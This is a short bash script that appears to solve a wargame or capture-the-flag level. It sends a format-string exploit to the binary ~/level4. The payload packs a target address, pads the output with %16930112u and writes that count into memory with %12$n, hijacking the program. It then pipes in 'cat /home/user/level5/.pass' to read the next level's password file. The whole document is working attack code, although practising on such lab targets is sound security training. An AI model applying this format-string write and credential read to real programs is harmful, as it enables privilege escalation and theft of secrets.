#!/bin/bash

(python -c 'import struct; print struct.pack("I", 0x8049810) + "%16930112u" + "%12$n"'; echo "cat /home/user/level5/.pass") | ~/level4
